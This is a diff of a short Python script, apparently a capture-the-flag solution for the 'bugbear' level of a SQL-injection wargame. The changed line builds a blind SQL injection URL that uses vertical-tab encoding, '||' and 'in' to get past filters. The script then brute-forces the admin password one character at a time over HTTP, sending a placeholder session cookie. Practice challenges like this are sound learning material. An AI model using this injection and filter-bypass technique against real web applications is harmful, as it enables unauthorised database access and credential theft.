@@ -8,7 +8,7 @@ pw=""
 for i in range(1,9):
   for j in range(48,128): # ascii code로 변환할 chr() 함수로 전달할 파라미터 값
     try:
-      url="https://los.rubiya.kr/chall/darkknight_5cfbc71e68e09f1b039a8204d1a81456.php?pw=1&no=1 or id like \"admin\" %26%26 right(left(pw, " + str(i) + "), 1) like\"" + chr(j) + "\""
+      url="https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?pw=1&no=2%0b%7C%7C%0bleft(id,5)%0bin%0b(\"admin\")%0b%26%26%0bright(left(pw," + str(i) + "),1)%0bin%0b(\"" + chr(j) + "\")"
       result = requests.post(url, cookies=(dict(PHPSESSID="세션값")))
     except:
       print("Error...")
